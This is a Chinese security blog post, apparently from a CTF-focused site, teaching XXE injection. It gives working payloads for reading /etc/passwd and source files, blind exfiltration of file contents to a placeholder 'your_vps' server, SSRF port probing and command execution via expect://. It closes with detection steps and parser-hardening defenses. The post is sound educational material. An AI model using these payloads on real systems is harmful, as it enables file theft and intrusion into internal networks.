+<h3 id="0x02-漏洞原因"><a href="#0x02-漏洞原因" class="headerlink" title="0x02 漏洞原因"></a>0x02 漏洞原因</h3><p>解析xml文件时允许加载外部实体，没有过滤用户提交的参数。</p>
+<p>造成的危害有：</p>
+<ul>
+<li><p>读取任意文件</p>
+</li>
+<li><p>执行系统命令</p>
+</li>
+<li><p>探查内网端口</p>
+</li>
+<li><p>攻击内网网站</p>
+</li>
+</ul>
+<br>
+
+<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><br>
+
+<p>关于XXE更多利用方式可参考: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p>
+<h5 id="一、读取本地文件（有回显）"><a href="#一、读取本地文件（有回显）" class="headerlink" title="一、读取本地文件（有回显）"></a>一、读取本地文件（有回显）</h5><p><strong>（1）利用xml外部实体</strong></p>
+<p>如index.php内容如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$xml</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xml&#x27;</span>]);</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>((<span class="keyword">string</span>)<span class="variable">$xml</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用payload为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///E:/test.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>将上面的payload进行url编码后既可以读到本地文件。</p>
+<p><strong>（2）xml引用外部实体(引用DTD文件)</strong></p>
+<p>还是上面的例子，payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"> <span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [<span class="meta">&lt;!ENTITY % a <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your_vps/test.dtd&quot;</span>&gt;</span> %a;]&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在你的服务器上创建dtd文件如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///E:/test.txt&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）base64读取php&#x2F;html等文件</strong></p>
+<p>如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php:&#x2F;&#x2F;filter将内容转换为base64后再读取。</p>
+<p>payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encodeing=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h5 id="二、Blind-XXE（无回显）"><a href="#二、Blind-XXE（无回显）" class="headerlink" title="二、Blind XXE（无回显）"></a>二、Blind XXE（无回显）</h5><p>对于无回显的xml注入，则使用如下<strong>Blind XXE</strong>方法，即使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。</p>
+<p>可以在你的vps上放xxe.dtd文件如下(send前面的是<code>%</code>的实体编码<code>&amp;#37;</code>):</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://your_vps:1234?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用的payload如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your_vps/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后监听1234端口并提交payload：<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XML-entity-injection-attack/2020032820023160.png" alt="在这里插入图片描述"></p>
+<br>
+
+<h5 id="三、SSRF-x2F-内网探测"><a href="#三、SSRF-x2F-内网探测" class="headerlink" title="三、SSRF&#x2F;内网探测"></a>三、SSRF&#x2F;内网探测</h5><p>由于xml实体注入攻击可以利用<code>http://</code>协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
+<p><strong>（1）探测内网端口</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;http://127.0.0.1:80&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="meta">&lt;root&gt;</span></span><br><span class="line"><span class="meta">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span></span><br><span class="line"><span class="meta">&lt;/root&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）攻击内网网站</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:80/payload&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h5 id="四、命令执行"><a href="#四、命令执行" class="headerlink" title="四、命令执行"></a>四、命令执行</h5><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令</p>
+<p>payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+<h5 id="五、利用本地dtd文件报错回显"><a href="#五、利用本地dtd文件报错回显" class="headerlink" title="五、利用本地dtd文件报错回显"></a>五、利用本地dtd文件报错回显</h5><p>当你有一个支持外部实体的XXE，但服务器的响应始终为空，这样情况就需要Blind XXE，但是如果你和目标服务器之间有防火墙，一般的利用vps外带数据的方法就不能用了。</p>
+<p>首先要知道，外部DTD允许我们在第二个实体中包含一个实体，但它在内部DTD中是被禁止的。</p>
+<p>所以要想在内部DTD子集中使用外部DTD语法，你可以在目标主机上强制执行本地dtd文件，并在其中重新定义一些参数实体引用：</p>
+<p>Payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">condition</span> <span class="string">&#x27;aaa)&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ELEMENT aa (bb&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>any text<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>sip-app_1_0.dtd 中的内容</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">condition</span> <span class="string">&quot;and | or | not | equal | contains | exists | subdomain-of&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">pattern</span> (%<span class="keyword">condition</span>;)&gt;</span></span><br></pre></td></tr></table></figure>
+<p>它起作用是因为所有XML实体都是常量，如果定义两个具有相同名称的实体则仅使用第一个实体。</p>
+<p><strong>Linux</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">ISOamsa</span> <span class="string">&#x27;Your DTD code&#x27;</span>&gt;</span></span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">SuperClass</span> <span class="string">&#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span></span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+<h3 id="0x04-判断XXE漏洞"><a href="#0x04-判断XXE漏洞" class="headerlink" title="0x04 判断XXE漏洞"></a>0x04 判断XXE漏洞</h3><br>
+
+<h5 id="一、XML是否被解析"><a href="#一、XML是否被解析" class="headerlink" title="一、XML是否被解析"></a>一、XML是否被解析</h5><p>尝试提交测试payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span>   </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [       </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&#x27;hava a xxe&#x27;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">]&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>看<code>&amp;xxe;</code>是否会变成<code>hava a xxe</code></p>
+<h5 id="二、是否支持外部实体"><a href="#二、是否支持外部实体" class="headerlink" title="二、是否支持外部实体"></a>二、是否支持外部实体</h5><p>测试payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> “http://your_vps/test.xml”&gt;</span>  </span></span><br><span class="line"><span class="meta">%xxe;  </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>通过查看自己服务器上的日志来，如果目标服务器是否向你的服务器发了一条请求test.xml的HTTP请求，则说明目标服务器支持外部实体。</p>
+<h5 id="三、是否能够回显"><a href="#三、是否能够回显" class="headerlink" title="三、是否能够回显"></a>三、是否能够回显</h5><p>如果上面两步都支持，就看是否回显。</p>
+<ul>
+<li><p>如果能回显就直接引用外部实体注入。</p>
+</li>
+<li><p>有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。</p>
+</li>
+</ul>
+<br>
+
+<h3 id="0x05-防御XXE"><a href="#0x05-防御XXE" class="headerlink" title="0x05 防御XXE"></a>0x05 防御XXE</h3><br>
+
+<h5 id="一、禁用外部实体"><a href="#一、禁用外部实体" class="headerlink" title="一、禁用外部实体"></a>一、禁用外部实体</h5><p><strong>（1）PHP</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）Python</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
+
+<p><strong>（3）Java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h5 id="二、过滤用户提交的XML数据"><a href="#二、过滤用户提交的XML数据" class="headerlink" title="二、过滤用户提交的XML数据"></a>二、过滤用户提交的XML数据</h5><p>过滤关键词：<code>&lt;!DOCTYPE和&lt;!ENTITY</code>或者<code>SYSTEM和PUBLIC</code>等。</p>
+<br>
+
+<br>
+
+<br>
+
+
+<p>参考链接：<br><a target="_blank" rel="noopener" href="https://www.smi1e.top/dsada/#XML">https://www.smi1e.top/dsada/#XML</a></p>
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2017/08/18/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">https://skysec.top/2017/08/18/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://lethe.site/2019/08/15/XML-entity-injection-attack/">https://lethe.site/2019/08/15/XML-entity-injection-attack/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/08/26/SUCTF-2019-Writeup/">SUCTF_2019_部分复现</a>
+            
+            
+            <a class="next" rel="next" href="/2019/08/13/Python-sandbox-escape/">python沙盒逃逸</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Lethe | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
